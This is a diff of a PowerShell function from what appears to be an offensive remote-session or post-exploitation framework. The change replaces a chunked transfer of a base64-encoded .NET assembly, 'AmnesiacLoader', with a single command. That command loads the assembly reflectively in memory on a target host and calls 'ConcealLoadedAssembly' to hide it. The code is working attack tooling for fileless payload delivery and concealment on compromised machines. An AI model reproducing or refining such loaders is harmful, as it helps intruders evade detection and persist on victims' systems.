@@ -3303,29 +3303,11 @@ function InteractWithPipeSession{
 				Write-Host " [-] AmnesiacLoader not embedded. Run AmnesiacLoader\Build.ps1 first." -ForegroundColor Red
 			} else {
 				Write-Host " [*] Delivering AmnesiacLoader to session..." -ForegroundColor Cyan
-				# Send as binary module: frame as base64 blob with binary flag
-				$sw.WriteLine("__MODULE_BEGIN__:AmnesiacLoader:$($AmnesiacLoaderB64.Length)")
-				$sw.Flush()
-				$chunkSz = 4096
-				for ($ci = 0; $ci -lt $AmnesiacLoaderB64.Length; $ci += $chunkSz) {
-					$chunk = $AmnesiacLoaderB64.Substring($ci, [Math]::Min($chunkSz, $AmnesiacLoaderB64.Length - $ci))
-					$sw.WriteLine("__MODULE_CHUNK__:$chunk")
-				}
-				$sw.Flush()
-				$sw.WriteLine("__MODULE_END__:AmnesiacLoader")
-				$sw.Flush()
-				# Target assembles and loads the assembly
-				$loadCmd = '$_loaderB64=[System.Text.StringBuilder]::new();while($true){$_mc=$sr.ReadLine();if($_mc-like"__MODULE_END__*"){break}elseif($_mc-like"__MODULE_CHUNK__*"){$_loaderB64.Append($_mc.Substring(16))|Out-Null}};$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String($_loaderB64.ToString()));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)'
+				$loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)"
 				$sw.WriteLine($loadCmd)
 				$sw.Flush()
-				# Read response
 				$resp = ""
 				while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; $resp += "$ln`n" }
-				Write-Host " [+] AmnesiacLoader loaded on target." -ForegroundColor Green
-				# Now send the actual base64 and load command
-				$sw.WriteLine("`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)")
-				$sw.Flush()
-				while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break } }
 				Write-Host " [+] AmnesiacLoader active and concealed." -ForegroundColor Green
 			}
 			continue
